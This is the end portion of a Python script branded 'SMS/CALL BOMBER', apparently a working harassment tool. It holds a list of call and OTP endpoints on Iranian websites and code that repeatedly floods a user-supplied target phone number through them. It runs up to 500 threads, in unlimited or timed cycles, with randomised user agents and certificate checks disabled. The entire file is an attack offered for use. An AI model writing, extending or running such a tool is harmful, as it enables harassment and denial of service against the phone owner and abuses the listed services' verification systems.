    {"name": "Hiss CALL", "method": "POST", "url": "https://hiss.ir/wp-admin/admin-ajax.php", "data": {"phone_email": "{phone_number_zero}", "action": "bakala_call_code"}, "is_call": True},
    {"name": "MartDay CALL", "method": "POST", "url": "https://martday.ir/api/customer/member/call/", "data": {"email": "{phone_number_zero}"}, "is_call": True},
    {"name": "Paaakar CALL", "method": "POST", "url": "https://api.paaakar.com/v1/customer/call-login", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "AtrinElec CALL", "method": "POST", "url": "https://www.atrinelec.com/ajax/CallVerfiyCode", "data": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Dastaneman CALL", "method": "POST", "url": "https://dastaneman.com/User/CallCode", "data": {"mobile": "0098{phone_number}"}, "is_call": True},
    {"name": "HovalVakil CALL", "method": "GET", "url": "https://api.hovalvakil.com/api/User/CallConfirmCode?userName={phone_number}", "is_call": True},
    {"name": "DigiGhate CALL", "method": "GET", "url": "https://api.digighate.com/v2/public/call?phone={phone_number}", "is_call": True},
    {"name": "Ketab CALL", "method": "GET", "url": "https://sso-service.ketab.ir/api/v2/signup/callotp?Mobile={phone_number_zero}", "is_call": True},
    {"name": "SnappShop CALL", "method": "POST", "url": "https://apix.snappshop.co/auth/v1/pre-login/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "PashikShoes CALL", "method": "POST", "url": "https://api.pashikshoes.com/v1/customer/call-login", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "TamimPishro CALL", "method": "POST", "url": "https://www.tamimpishro.com/site/api/v1/user/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Fafait CALL", "method": "POST", "url": "https://api2.fafait.net/oauth/call-user", "payload": {"id": "{phone_number_zero}"}, "is_call": True},
    {"name": "Telewebion CALL", "method": "POST", "url": "https://gateway.telewebion.com/shenaseh/api/v2/auth/call", "payload": {"code": "98", "phone": "{phone_number}"}, "is_call": True},
    {"name": "Caropex CALL", "method": "POST", "url": "https://caropex.com/api/v1/user/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "HamrahSport CALL", "method": "POST", "url": "https://hamrahsport.com/call-otp", "data": {"cell": "{phone_number}", "call_otp": "1"}, "is_call": True},
    {"name": "Dalfak CALL", "method": "POST", "url": "https://www.dalfak.com/api/auth/sendCallCode", "payload": {"type": 1, "value": "{phone_number_zero}"}, "is_call": True},
    {"name": "ParkBag CALL", "method": "POST", "url": "https://parkbag.com/fa/Account/CallOTP", "data": {"MobaileNumber": "{phone_number}"}, "is_call": True},
    {"name": "AdinehBook CALL", "method": "POST", "url": "https://www.adinehbook.com/gp/flex/call-sign.html", "data": {"action": "call", "phone_cell_or_email": "{phone_number_zero}"}, "is_call": True},
    {"name": "Meidane CALL", "method": "POST", "url": "https://meidane.com/accounts/call", "data": {"mobile": "{phone_number}"}, "is_call": True},
    {"name": "TechSiro CALL", "method": "POST", "url": "https://techsiro.com/call-otp", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Eaccount CALL", "method": "POST", "url": "https://eaccount.ir/api/v1/sessions/call_request", "payload": {"mobile_phone": "{phone_number_zero}"}, "is_call": True},
    {"name": "MyDigiPay CALL", "method": "POST", "url": "https://app.mydigipay.com/digipay/api/users/call-sms", "payload": {"cellNumber": "{phone_number_zero}"}, "is_call": True},
    {"name": "FoodCenter CALL", "method": "POST", "url": "https://www.foodcenter.ir/account/callmobile", "data": "mobile={phone_number_zero}", "is_call": True},
    {"name": "IranTic CALL", "method": "POST", "url": "https://www.irantic.com/api/login/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
    {"name": "Dadhesab CALL", "method": "POST", "url": "https://api.dadhesab.ir/user/call", "payload": {"username": "{phone_number_zero}"}, "is_call": True},
    {"name": "WatchOnline CALL", "method": "POST", "url": "https://api.watchonline.shop/api/v1/otp/call", "payload": {"mobile": "{phone_number_zero}"}, "is_call": True},
]

def clear_screen():
    os.system('clear' if os.name != 'nt' else 'cls')

def display_banner():
    clear_screen()
    console.print(Align.center(f"[bold {CYAN}]==================================================[/]"))
    console.print(Align.center("[bold #ff00ff]    ╔══════════════════════════════════════════╗[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ███████╗███╗   ███╗███████╗            ║[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ██╔════╝████╗ ████║██╔════╝            ║[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ███████╗██╔████╔██║███████╗            ║[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ╚════██║██║╚██╔╝██║╚════██║            ║[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ███████║██║ ╚═╝ ██║███████║            ║[/]"))
    console.print(Align.center("[bold #ff00ff]    ║   ╚══════╝╚═╝     ╚═╝╚══════╝            ║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ██████╗  ██████╗ ███╗   ███╗██████╗ ║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ██╔══██╗██╔═══██╗████╗ ████║██╔══██╗║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ██████╔╝██║   ██║██╔████╔██║██████╔╝║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ██╔══██╗██║   ██║██║╚██╔╝██║██╔══██╗║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ██████╔╝╚██████╔╝██║ ╚═╝ ██║██████╔╝║[/]"))
    console.print(Align.center("[bold #1AA260]    ║      ╚═════╝  ╚═════╝ ╚═╝     ╚═╝╚═════╝ ║[/]"))
    console.print(Align.center("[bold #1aa260]    ╚══════════════════════════════════════════╝[/]"))
    console.print(Align.center(f"[bold {GREEN}]⚡ SMS/CALL BOMBER - 800+ APIs ⚡  [bold {YELLOW}]POWERED BY ItzHosseinYc[/]"))
    console.print(Align.center(f"[bold {CYAN}]==================================================[/]"))
    console.print()

def format_time(minutes):
    """تبدیل دقیقه به فرمت خوانا"""
    if minutes <= 0:
        return "نامحدود"
    
    hours = minutes // 60
    mins = minutes % 60
    
    if hours > 0 and mins > 0:
        return f"{hours}h {mins}m"
    elif hours > 0:
        return f"{hours}h"
    elif mins > 0:
        return f"{mins}m"
    else:
        return "1m"

def get_user_inputs():
    console.print(f"\n[{PINK}]┌──[/] [{WHITE}]TARGET NUMBER[/]")
    phone = console.input(f"[{RED}]└─[/]► ")
    
    console.print(f"\n[{GREEN}]┌──[/] [{WHITE}]THREADS (1-1000)[/]")
    try:
        threads = int(console.input(f"[{GREEN}]└─[/]► ") or "500")
        if threads > 500:
            threads = 500
        if threads < 1:
            threads = 1
    except:
        threads = 500
    
    console.print(f"\n[{YELLOW}]┌──[/] [{WHITE}]TIMER (Minutes)[/]")
    try:
        timer_minutes = int(console.input(f"[{YELLOW}]└─[/]► ") or "0")
        if timer_minutes < 0:
            timer_minutes = 0
    except:
        timer_minutes = 0
    
    return phone, threads, timer_minutes

def show_target_info(phone_full, num_threads, api_count, sms_count, call_count, timer_minutes):
    console.print(f"\n[{PINK}]╔══════════════════════════════╗[/]")
    console.print(f"[{PINK}]║ Target: [{GREEN}]{phone_full}[/]")
    console.print(f"[{PINK}]║ Threads: [{YELLOW}]{num_threads}[/]")
    console.print(f"[{PINK}]║ SMS APIs: [{CYAN}]{sms_count}[/]")
    console.print(f"[{PINK}]║ CALL APIs: [{CYAN}]{call_count}[/]")
    console.print(f"[{PINK}]║ Total APIs: [{GREEN}]{api_count}[/]")
    
    if timer_minutes > 0:
        console.print(f"[{PINK}]║ Timer: [{YELLOW}]{format_time(timer_minutes)}[/]")
    else:
        console.print(f"[{PINK}]║ Timer: [{YELLOW}]∞ Unlimited[/]")
    
    console.print(f"[{PINK}]║ Status: [{GREEN}]ATTACKING...[/]")
    console.print(f"[{PINK}]╚══════════════════════════════╝[/]\n")

def create_session():
    """ایجاد session با retry و pool connections"""
    session = requests.Session()
    retry = Retry(total=0, connect=0, backoff_factor=0)
    adapter = HTTPAdapter(max_retries=retry, pool_connections=500, pool_maxsize=500)
    session.mount('http://', adapter)
    session.mount('https://', adapter)
    return session

def send_request(api_config, phone_numbers, session):
    try:
        method = api_config.get("method", "POST").upper()
        url = api_config["url"]
        
        for key, value in phone_numbers.items():
            url = url.replace("{" + key + "}", value)
        
        headers = {
            'User-Agent': ua.random,
            'Accept': '*/*',
            'Connection': 'keep-alive'
        }
        
        req_kwargs = {"headers": headers, "timeout": REQUEST_TIMEOUT, "verify": False}
        
        if "payload" in api_config:
            payload_str = json.dumps(api_config["payload"])
            for key, value in phone_numbers.items():
                payload_str = payload_str.replace("{" + key + "}", value)
            try:
                req_kwargs["json"] = json.loads(payload_str)
            except:
                req_kwargs["data"] = payload_str
        elif "data" in api_config:
            data_str = str(api_config["data"])
            if isinstance(api_config["data"], dict):
                data_str = json.dumps(api_config["data"])
            for key, value in phone_numbers.items():
                data_str = data_str.replace("{" + key + "}", value)
            try:
                req_kwargs["data"] = json.loads(data_str)
            except:
                req_kwargs["data"] = data_str
        elif "params" in api_config:
            params_str = json.dumps(api_config["params"])
            for key, value in phone_numbers.items():
                params_str = params_str.replace("{" + key + "}", value)
            try:
                req_kwargs["params"] = json.loads(params_str)
            except:
                pass
        
        response = session.request(method, url, **req_kwargs)
        return True
    except:
        return False

def main():
    try:
        requests.packages.urllib3.disable_warnings()
        display_banner()
        
        phone_input, num_threads, timer_minutes = get_user_inputs()
        
        if phone_input.startswith("0"):
            phone_full = "+98" + phone_input[1:]
        elif phone_input.startswith("98"):
            phone_full = "+" + phone_input
        elif phone_input.startswith("+98"):
            phone_full = phone_input
        else:
            console.print(f"[bold {RED}]INVALID NUMBER![/]")
            sys.exit(1)
        
        phone_numbers = {
            "phone_number": phone_full.replace("+98", ""),
            "phone_number_full": phone_full,
            "phone_number_zero": "0" + phone_full.replace("+98", "")
        }
        
        # حذف تکراری و شمارش CALL APIs
        unique_apis = []
        seen = set()
        sms_count = 0
        call_count = 0
        
        for api in API_LIST:
            identifier = (api["url"], api.get("method", "POST"))
            if identifier not in seen:
                unique_apis.append(api)
                seen.add(identifier)
                if api.get("is_call", False):
                    call_count += 1
                else:
                    sms_count += 1
        
        apis = unique_apis
        api_count = len(apis)
        
        show_target_info(phone_full, num_threads, api_count, sms_count, call_count, timer_minutes)
        
        success_count = 0
        failed_count = 0
        cycle = 1
        
        # محاسبه زمان پایان
        start_time = time.time()
        end_time = start_time + (timer_minutes * 60) if timer_minutes > 0 else None
        
        # ایجاد session مشترک
        shared_session = create_session()
        
        # رنگ‌های RGB برای progress bar
        rgb_colors = ["#ff0000", "#ff7700", "#ffff00", "#00ff00", "#00ffff", "#0000ff", "#ff00ff"]
        color_index = 0
        
        with Progress(
            SpinnerColumn(spinner_name="dots"),
            TextColumn(f"[{{task.fields[status_color]}}]{{task.description}}[/]"),
            BarColumn(bar_width=None, style="white", complete_style=f"{rgb_colors[0]}"),
            TextColumn(f"[{{task.fields[status_color]}}]{{task.percentage:>3.0f}}%[/]"),
            TextColumn("⏱ {task.fields[timer]}"),
            console=console,
            refresh_per_second=10
        ) as progress:
            
            while True:
                # بررسی زمان
                if end_time and time.time() >= end_time:
                    console.print(f"\n[{YELLOW}]⏰ TIMER FINISHED! ({format_time(timer_minutes)})[/]")
                    console.print(f"[{GREEN}]✓ TOTAL SUCCESS: {success_count}[/]  [{RED}]✗ TOTAL FAILED: {failed_count}[/]  [{CYAN}]TOTAL CYCLES: {cycle - 1}[/]")
                    console.input(f"\n[{PINK}]Press Enter to exit...[/]")
                    sys.exit(0)
                
                # محاسبه زمان باقیمانده
                if end_time:
                    remaining = max(0, int(end_time - time.time()))
                    remaining_m = remaining // 60
                    remaining_s = remaining % 60
                    timer_text = f"{remaining_m}:{remaining_s:02d}" if remaining > 0 else "0:00"
                else:
                    timer_text = "∞"
                
                # تغییر رنگ بار هر سیکل
                bar_color = rgb_colors[color_index % len(rgb_colors)]
                color_index += 1
                
                task_id = progress.add_task(
                    f"CYCLE {cycle} | ✓{success_count} ✗{failed_count}",
                    total=api_count,
                    status_color=bar_color,
                    timer=timer_text
                )
                progress.columns[2].complete_style = bar_color
                
                with ThreadPoolExecutor(max_workers=num_threads) as executor:
                    future_to_api = {executor.submit(send_request, api, phone_numbers, shared_session): api for api in apis}
                    
                    for future in as_completed(future_to_api):
                        api = future_to_api[future]
                        
                        try:
                            if future.result():
                                success_count += 1
                            else:
                                failed_count += 1
                        except:
                            failed_count += 1
                        
                        # بررسی زمان در حین اجرا
                        if end_time and time.time() >= end_time:
                            break
                        elif end_time:
                            remaining = max(0, int(end_time - time.time()))
                            remaining_m = remaining // 60
                            remaining_s = remaining % 60
                            progress.update(task_id, timer=f"{remaining_m}:{remaining_s:02d}" if remaining > 0 else "0:00")
                        
                        progress.update(task_id, advance=1, description=f"CYCLE {cycle} | ✓{success_count} ✗{failed_count}")
                
                progress.remove_task(task_id)
                
                # نمایش خلاصه سیکل
                if end_time:
                    remaining = max(0, int(end_time - time.time()))
                    remaining_m = remaining // 60
                    remaining_s = remaining % 60
                    timer_left = f"{remaining_m}:{remaining_s:02d}" if remaining > 0 else "0:00"
                else:
                    timer_left = "∞"
                
                console.print(f"[{PINK}]✓ {success_count}[/] [{RED}]✗ {failed_count}[/] [{CYAN}]CYCLE {cycle}[/] [{YELLOW}]⏱ {timer_left}[/]")
                
                # کاهش delay بین سیکل‌ها
                time.sleep(0.5)
                cycle += 1
                
    except KeyboardInterrupt:
        console.print(f"\n[{YELLOW}] STOPPED BY USER [/]")
        
        elapsed_time = int(time.time() - start_time)
        elapsed_min = elapsed_time // 60
        elapsed_sec = elapsed_time % 60
        console.print(f"[{GREEN}]✓ FINAL SUCCESS: {success_count}[/]  [{RED}]✗ FINAL FAILED: {failed_count}[/]")
        console.print(f"[{CYAN}]TOTAL CYCLES: {cycle - 1}[/]  [{YELLOW}]TIME: {elapsed_min}m {elapsed_sec}s[/]")
        sys.exit(0)
    except ImportError as e:
        console.print(f"[red]Install required: pip install requests rich fake_useragent\nError: {e}[/red]")
        sys.exit(1)

if __name__ == "__main__":
    main()